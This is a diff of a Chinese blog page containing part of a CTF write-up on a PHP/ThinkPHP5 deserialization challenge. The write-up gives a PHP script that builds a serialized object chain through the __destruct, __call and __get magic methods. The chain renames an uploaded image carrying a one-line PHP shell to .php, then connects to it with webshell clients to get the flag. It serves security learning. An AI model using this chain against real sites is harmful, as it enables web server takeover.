+<p>&#x770B;&#x6700;&#x540E;&#x7684;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x7C7B;&#x521B;&#x5EFA;&#x5B8C;&#x6BD5;&#x4E4B;&#x540E;&#x6240;&#x89E6;&#x53D1;&#xFF0C;&#x8FD9;&#x91CC;$this-&gt;checker&#x8C03;&#x7528;&#x4E86;index()&#xFF0C;&#x540E;&#x9762;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x91CC;&#x6765;&#x6784;&#x9020;payload&#x3002;</p>
+<h2 id="&#x6839;&#x636E;payload&#x6765;&#x770B;&#x89E3;&#x9898;&#x7684;&#x601D;&#x8DEF;"><a href="#&#x6839;&#x636E;payload&#x6765;&#x770B;&#x89E3;&#x9898;&#x7684;&#x601D;&#x8DEF;" class="headerlink" title="&#x6839;&#x636E;payload&#x6765;&#x770B;&#x89E3;&#x9898;&#x7684;&#x601D;&#x8DEF;"></a>&#x6839;&#x636E;payload&#x6765;&#x770B;&#x89E3;&#x9898;&#x7684;&#x601D;&#x8DEF;</h2><p>&#x751F;&#x6210;Payload&#x7684;&#x811A;&#x672C;:</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">  <span class="hljs-keyword">public</span> $registed=<span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($check)</span></span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;checker=$check;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> $except = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;index&apos;</span>=&gt;<span class="hljs-string">&apos;upload_img&apos;</span>);</span><br><span class="line">  <span class="hljs-keyword">public</span> $ext = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">public</span> $filename_tmp = <span class="hljs-string">&quot;./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.png&quot;</span>;</span><br><span class="line">  <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&quot;./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.php&quot;</span>;</span><br><span class="line">}</span><br><span class="line">$a=<span class="hljs-keyword">new</span> Register(<span class="hljs-keyword">new</span> Profile());</span><br><span class="line"><span class="hljs-keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5728;&#x770B;&#x4E86;payload&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x6574;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#x6211;&#x81EA;&#x5DF1;&#x7684;&#x601D;&#x8DEF;&#xFF1A;</p>
+<p>profile.php&#x91CC;&#x7684;upload_img&#x51FD;&#x6570;&#x4E2D;&#x6709;&#x4E00;&#x5904;&#x590D;&#x5236;&#x56FE;&#x7247;&#x5230;&#x65B0;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x539F;&#x6765;&#x56FE;&#x7247;&#x7684;&#x8BED;&#x53E5;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);       <span class="hljs-comment">//&#x5C06;&#x8001;&#x56FE;&#x7247;&#x7684;&#x5730;&#x5740;&#x6539;&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5730;&#x5740;&#x3002;</span></span><br><span class="line">@unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);              <span class="hljs-comment">//&#x5220;&#x9664;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C06;filename_tmp&#x8D4B;&#x503C;&#x4E3A;.png&#x540E;&#x7F00;&#xFF0C;&#x5C06;filename&#x8D4B;&#x503C;&#x4E3A;.php&#x540E;&#x7F00;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x5C06;.png&#x540E;&#x7F00;&#x7684;&#x56FE;&#x7247;&#x4FEE;&#x6539;&#x4E3A;.php&#x5E76;&#x628A;&#x539F;&#x6765;&#x540E;&#x7F00;&#x4E3A;.png&#x7684;&#x56FE;&#x7247;&#x5220;&#x9664;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x56FE;&#x7247;&#x4E2D;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x8FDB;&#x800C;getshell&#x3002;</p>
+<p>&#x800C;&#x8981;&#x91CD;&#x5B9A;&#x4E49;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x5F97;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5E76;&#x4E14;&#x7ED5;&#x8FC7;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x548C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4FEE;&#x6539;&#x6210;&#x529F;&#x8FD9;&#x4E24;&#x4E2A;if&#x8BED;&#x53E5;&#x3002;</p>
+<p>&#x5F53;&#x6211;&#x4EEC;&#x8FD8;&#x672A;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#x65F6;&#xFF0C;<code>if(!empty($_FILES))</code>&#x662F;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7684;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x6267;&#x884C;ext_check()&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;&#x6211;&#x4EEC;&#x518D;&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;$ext&#x8D4B;&#x503C;&#x4E3A;1&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x8FD9;&#x4E24;&#x4E2A;if&#x8BED;&#x53E5;&#x4E86;&#x3002;</p>
+<p>&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x662F;&#x4E0D;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x51FD;&#x6570;&#x7684;&#x3002;</p>
+<p>&#x8FD8;&#x8BB0;&#x5F97;&#x524D;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x5417;&#xFF1F;</p>
+<p>&#x4ECE;payload&#x811A;&#x672C;&#x5F53;&#x4E2D;&#x770B;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;$this-&gt;checker&#x8D4B;&#x503C;&#x4E3A;Profile&#x8FD9;&#x4E2A;&#x7C7B;&#x3002;</p>
+<p>&#x9875;&#x9762;Register.php&#x5728;&#x8C03;&#x7528;$this-&gt;checker&#x65F6;&#x7684;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed){</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;$this-&gt;checker-&gt;index();&#x4E5F;&#x5C31;&#x662F;&#x4ECE;Profile&#x7C7B;&#x4E2D;&#x8C03;&#x7528;&#x4E86;index()&#xFF0C;&#x800C;Profile&#x7C7B;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;index()&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
+<p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x5230;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x7684;<code>__call()</code></p>
+<p>&#x5728;call&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#x540D;&#x4E3A;&#x53D8;&#x91CF;index&#x7684;&#x503C;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x800C;Profile&#x7C7B;&#x4E2D;&#x6CA1;&#x6709;index&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x53C8;&#x4F1A;&#x89E6;&#x53D1;<code>__get()</code>&#x8FD9;&#x4E2A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</p>
+<p>&#x5728;get&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;except[&#x2018;index&#x2019;]&#x7684;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5728;&#x6784;&#x9020;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C31;&#x5C06;&#x5176;&#x8D4B;&#x503C;&#x4E3A;upload_img&#x3002;</p>
+<p>&#x8FD9;&#x6837;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;upload_img&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4E86;&#x3002;</p>
+<p>&#x6700;&#x7EC8;&#x7684;&#x6B65;&#x9AA4;&#x5C31;&#x662F;&#xFF1A;</p>
 <ol>
-<li>设置$register=0</li>
-<li>调用Profile类</li>
-<li>设置except数组，index-&gt;upload_img</li>
-<li>设置$ext=1，$filename,$filename_tmp</li>
-<li>由2触发call，call调用get，call最终调用upload_img函数</li>
-<li>修改文件名</li>
-<li>菜刀连接</li>
+<li>&#x8BBE;&#x7F6E;$register=0</li>
+<li>&#x8C03;&#x7528;Profile&#x7C7B;</li>
+<li>&#x8BBE;&#x7F6E;except&#x6570;&#x7EC4;&#xFF0C;index-&gt;upload_img</li>
+<li>&#x8BBE;&#x7F6E;$ext=1&#xFF0C;$filename,$filename_tmp</li>
+<li>&#x7531;2&#x89E6;&#x53D1;call&#xFF0C;call&#x8C03;&#x7528;get&#xFF0C;call&#x6700;&#x7EC8;&#x8C03;&#x7528;upload_img&#x51FD;&#x6570;</li>
+<li>&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D;</li>
+<li>&#x83DC;&#x5200;&#x8FDE;&#x63A5;</li>
 </ol>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>注册一个账号，上传一个包含php一句话的图片，将脚本中的图片名修改为上传后生成的图片名。</p>
-<p>注册一个新账号，登录。将payload生成出来，在用户主页修改cookies，刷新。</p>
-<p>用菜刀或者蚁剑连接图片名.php，在根目录下拿到flag。</p>
+<h2 id="&#x590D;&#x73B0;"><a href="#&#x590D;&#x73B0;" class="headerlink" title="&#x590D;&#x73B0;"></a>&#x590D;&#x73B0;</h2><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x5305;&#x542B;php&#x4E00;&#x53E5;&#x8BDD;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x5C06;&#x811A;&#x672C;&#x4E2D;&#x7684;&#x56FE;&#x7247;&#x540D;&#x4FEE;&#x6539;&#x4E3A;&#x4E0A;&#x4F20;&#x540E;&#x751F;&#x6210;&#x7684;&#x56FE;&#x7247;&#x540D;&#x3002;</p>
+<p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x65B0;&#x8D26;&#x53F7;&#xFF0C;&#x767B;&#x5F55;&#x3002;&#x5C06;payload&#x751F;&#x6210;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x7528;&#x6237;&#x4E3B;&#x9875;&#x4FEE;&#x6539;cookies&#xFF0C;&#x5237;&#x65B0;&#x3002;</p>
+<p>&#x7528;&#x83DC;&#x5200;&#x6216;&#x8005;&#x8681;&#x5251;&#x8FDE;&#x63A5;&#x56FE;&#x7247;&#x540D;.php&#xFF0C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x62FF;&#x5230;flag&#x3002;</p>
 <p><img src="https://i.loli.net/2019/05/26/5cea55c1ec25028053.jpg" alt="xiugaitupian.jpg"></p>
 <p><img src="https://i.loli.net/2019/05/26/5cea55c3c204d65669.jpg" alt="xiugaihou.jpg"></p>
 <p><img src="https://i.loli.net/2019/05/26/5cea55c23688270315.jpg" alt="getflag.jpg"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学长们的思路真的太强了，每个重要的语句，环环相扣达到最终彼岸。</p>
-<p>最TP5这类框架还是不太熟悉，后面还要多总结学习。</p>
+<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>&#x5B66;&#x957F;&#x4EEC;&#x7684;&#x601D;&#x8DEF;&#x771F;&#x7684;&#x592A;&#x5F3A;&#x4E86;&#xFF0C;&#x6BCF;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x73AF;&#x73AF;&#x76F8;&#x6263;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x5F7C;&#x5CB8;&#x3002;</p>
+<p>&#x6700;TP5&#x8FD9;&#x7C7B;&#x6846;&#x67B6;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x719F;&#x6089;&#xFF0C;&#x540E;&#x9762;&#x8FD8;&#x8981;&#x591A;&#x603B;&#x7ED3;&#x5B66;&#x4E60;&#x3002;</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Writeup/">#Writeup</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/PHP/">#PHP</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/代码审计/">#代码审计</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/05/29/PHP代码审计之SQL注入与审计流程/">PHP代码审计之学习SQL注入与审计流程</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/05/18/PHP代码审计之重装漏洞/">PHP代码审计之重装漏洞</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
 
     </div>
-
-    
-    
-    
-        
-      
-
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/PHP代码审计/" rel="tag"># PHP代码审计</a>
-            
-          </div>
-        
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/05/18/PHP代码审计之重装漏洞/" rel="next" title="PHP代码审计之重装漏洞">
-                  <i class="fa fa-chevron-left"></i> PHP代码审计之重装漏洞
-                </a>
-              
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/05/29/PHP代码审计之SQL注入与审计流程/" rel="prev" title="PHP代码审计之学习SQL注入与审计流程">
-                  PHP代码审计之学习SQL注入与审计流程 <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#说在前面"><span class="nav-number">1.</span> <span class="nav-text">说在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#根据payload来看解题的思路"><span class="nav-number">3.</span> <span class="nav-text">根据payload来看解题的思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现"><span class="nav-number">4.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
